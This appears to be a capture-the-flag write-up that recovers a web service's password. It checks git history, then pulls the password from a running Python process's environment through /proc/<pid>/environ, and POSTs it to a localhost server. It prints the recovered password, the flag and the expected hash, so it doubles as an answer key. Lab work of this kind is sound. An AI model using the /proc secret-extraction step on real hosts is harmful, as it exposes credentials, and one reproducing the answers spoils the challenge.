1. Digging into Git History
Since the developer used git, I started by checking the commit history to see if any secrets were accidentally committed and then removed.

```Bash
ls -la /home/admin  # Found .git directory
git log -p          # Analyzed code changes
```
Finding: The source code (webserver_v1.py) revealed that the password was NOT hardcoded but fetched from an environment variable:


```Python
super_secret_password = os.environ.get('SUPERSECRETPASSWORD')
```
2. Extracting Environment Variables from Memory
Even though the password wasn't in the code, the running process must have it in memory. I inspected the /proc filesystem to find the environment variables of the running Python process.

```Bash
# Finding the password in the process environment
strings /proc/$(pgrep -f python)/environ | grep SUPERSECRETPASSWORD
```
Extracted Password: bdFBkE4suaCy

3. Exploiting the Web Service
Using the extracted password, I performed a POST request to the local web server to get the secret.

```Bash
curl -X POST -F "password=bdFBkE4suaCy" http://127.0.0.1:5000
```
Server Response: Access granted! Secret is QhyjuI98BBvf

4. Final Solution
Saved the secret to the required location:

```Bash
echo "QhyjuI98BBvf" > ~/mysolution
```
✅ Verification
The solution was verified using the MD5 hash:

Command: ```md5sum ~/mysolution```

Expected Hash: a250aa19f16dda6f9fcef286f035ec4b
